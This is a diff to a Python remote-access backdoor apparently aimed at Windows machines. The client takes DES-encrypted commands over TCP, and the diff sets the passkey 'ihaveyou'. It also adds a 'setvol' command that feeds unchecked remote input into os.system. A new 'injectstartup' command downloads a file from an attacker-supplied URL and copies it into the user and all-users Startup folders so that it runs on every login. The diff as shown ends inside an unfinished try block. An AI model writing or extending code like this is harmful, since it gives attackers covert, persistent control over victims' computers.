@@ -18,14 +18,18 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from pyDes import *
 import base64
+from win32com.shell import shell, shellcon
 
 # things you need to fill in
 TCP_IP = '127.0.0.1'
 TCP_PORT = 80
 BUFFER_SIZE = 1024  # Normally 1024, but we want fast response
 # PASSKEY MUST BE EXACTLY 8 BYTES LONG
-PASSKEY = "aaaaaaaa"
+PASSKEY = "ihaveyou"
 
+
+def get_startup_directory(common):  
+    return shell.SHGetFolderPath(0, (shellcon.CSIDL_STARTUP, shellcon.CSIDL_COMMON_STARTUP)[common], None, 0)
 
 def encrypt(password, data):
     k = des(password, CBC, "\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
@@ -193,6 +197,15 @@ while 1:
                     os.system("/temp/SetVol.exe 100")
                     os.system("/temp/SetVol.exe 99")
                     s = s + 1
-
+    elif data[0] == "setvol":
+        if len(data) == 2:
+            os.system("/temp/SetVol.exe " + data[1])
+    elif data[0] == "injectstartup":
+        if len(data) > 1:
+            try:
+                if data[1] == "startdirectory":
+                    wget.download(data[2], "/temp/" + data[3])
+                    os.system("copy /temp/" + data[3] + " C:/" + "Users/" + "/%USERNAME%/" + '"AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/' + data[3] + '"')
+                    os.system("copy /temp/" + data[3] + ' "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/startup/' + data[3] + '"')
 
 conn.close()
